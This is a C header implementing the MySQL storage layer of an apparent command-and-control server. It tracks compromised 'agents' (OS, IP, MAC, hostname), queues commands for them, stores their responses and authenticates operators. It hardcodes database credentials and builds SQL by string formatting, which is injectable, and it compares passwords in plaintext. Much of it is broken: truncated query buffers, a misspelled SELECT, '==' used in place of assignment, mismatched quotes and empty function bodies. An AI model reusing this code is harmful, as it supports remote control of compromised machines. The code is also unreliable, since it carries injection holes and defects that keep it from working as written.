#ifndef database
#define database

#include <mysql/mysql.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

#define BUFFER_SIZE 4096
#define MAX_INFO 999999999

char dbserver[256] = "172.17.0.2";
char user[32] = "laporte";
char pass[32] = "core";
char db[32] = "c2_database";

struct db_agents {
    char agent_id[65];
    char os[50];
    char ip[50];
    char mac[50];
    char hostname[255];
};

struct db_tasks {
    char agent_id[65];
    char command[1024];
    char response[BUFFER_SIZE];
};

struct db_logs {
    char agent_id[65];
    char log_type[16];
    char message[BUFFER_SIZE];
};


MYSQL *con;
int db_conn() {
    con = mysql_init(NULL);
    if (con == NULL) {
        fprintf(stderr, "%s\n", mysql_error(con));
        return -1;
    }
    // connect to dabatabase
    if (mysql_real_connect(con, dbserver, user, pass, db, 0, NULL, 0) == NULL) {
        fprintf(stderr, "%s\n", mysql_error(con));
        return -1;
    }
    printf("connect to database");
}

void db_close() {
    mysql_close(con);
}

int check_agent_id(char *agent_id) {
    char query[1024];
    snprintf(query, sizeof(query), "SELECT * FROM Agents WHERE agent_id = '%s'", agent_id);
    if (mysql_query(con, query)) {
        fprintf(stderr, "%s\n", mysql_error(con));
        mysql_close(con);
    }
    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL) { 
        fprintf(stderr, "%s\n", mysql_error(con));
        mysql_close(con);
        return 0;
    }
    int num_rows = mysql_num_rows(result);
    mysql_free_result(result);

    return (num_rows > 0); // 1 if agent exists, 0 if not
}

char *get_task(int task_id) {
    char query[1024];
    snprintf(query, sizeof(query), "SELECT command FROM Tasks WHERE task_id = %d", task_id);
    if (mysql_query(con, query)) {
        fprintf(stderr, "%s\n", mysql_error(con));
    }
    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL) { 
        fprintf(stderr, "%s\n", mysql_error(con));
        return "none";
    }
    MYSQL_ROW row;
    if ((row = mysql_fetch_row(result))) {
        char *cmd = strdup(row[0]);  // make a copy of the command string
        mysql_free_result(result);
        return cmd;
    }

    mysql_free_result(result);
    return NULL;

}


int store_result(cJSON *response) {

}


int check_tasks_queue(char *agent_id) {
    char query[1024];
    snprintf(query, sizeof(query), "SELECT task_id, status FROM Tasks WHERE agent_id = '%s'", agent_id);
    if (mysql_query(con, query)) {
        fprintf(stderr, "%s\n", mysql_error(con));
        return -1;
    }

    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL) { 
        fprintf(stderr, "%s\n", mysql_error(con));
        return -1;
    }
    int num_rows = mysql_num_rows(result);
    int num_fields = mysql_num_fields(result); // columns

    MYSQL_ROW row;


    while ((row = mysql_fetch_row(result))) {
        for (int i = 0;i < num_rows; i++) {
            // status
            if (row[1] == true) {
                int task_id = strdup(row[0]);
                mysql_free_result(result);
                return task_id;
            }
        }
    }

    mysql_free_result(result);
    return -1;
}


void AgentsTable(struct db_agents args) {
    char *query = malloc(1024 + sizeof(struct db_agents));
    snprintf(query, sizeof(query), "INSERT INTO Agents (agent_id, os, ip, mac, hostname) VALUES ('%s', '%s, '%s, '%s', '%s');", args.agent_id, args.os, args.ip , args.mac, args.hostname);
    if (mysql_query(con, query)) {
        fprintf(stderr, "%s\n", mysql_error(con));
    }
    free(query);
}


int TasksTable(struct db_tasks args) {
    char *query = malloc(1024+sizeof(struct db_tasks));
    snprintf(query,sizeof(query), "INSERT INTO Tasks (agent_id, command, response) VALUES ('%s', '%s', '%s');", args.agent_id, args.command, args.response);
    if (mysql_query(con, query)) {
        fprintf(stderr, "%s\n", mysql_error(con));
    }
    free(query);
}


int LogsTable(struct db_logs args) {
    char *query= malloc(1024+sizeof(struct db_logs));
    snprintf(query, sizeof(query),"INSERT INTO Logs (agent_id, log_type, message) VALUES ('%s', '%s', '%s');", args.agent_id, args.log_type, args.message);
    if (mysql_query(con, query)) {
        fprintf(stderr, "%s\n", mysql_error(con));
    }
    free(query);
}


void info_view(char *table) {
    char *query = malloc(1024);
    snprintf(query, sizeof(query), "SELETCT * FROM %s", table);
    if (mysql_query(con, query)) {
        fprintf(stderr, "%s\n", mysql_error(con));
    }


    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL) { 
        fprintf(stderr, "%s\n", mysql_error(con));
        return -1;
    }
    int num_rows = mysql_num_rows(result);
    int num_fields = mysql_num_fields(result); // columns

    char *info = malloc(MAX_INFO);
    MYSQL_FIELD field;


    MYSQL_ROW row;
    while ((row = mysql_fetch_row(result))) {

    }

    mysql_free_result(result);
    free(query);
}


int authenticate_operator(char *username, char*password) {
    char *query = malloc(2048);
    snprintf(query, sizeof(query), "SELECT * FROM Operators;");
    if (mysql_query(con, query)) {
        fprintf(stderr, "%s\n", mysql_error(con));
    }

    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL) { 
        fprintf(stderr, "%s\n", mysql_error(con));
        return -1;
    }
    int num_rows = mysql_num_rows(result);
    int num_fields = mysql_num_fields(result); // columns

    MYSQL_ROW row;
    
    while ((row == mysql_fetch_row(result))) {
        for (int i = 0;i < num_fields; i++) {
            if (strcmp(row[1], username) == 0 && strcmp(row[2], password) == 0) {
                return 0;
            }
        }
    }
    mysql_free_result(result);
    free(query);
    return -1;
}




#endif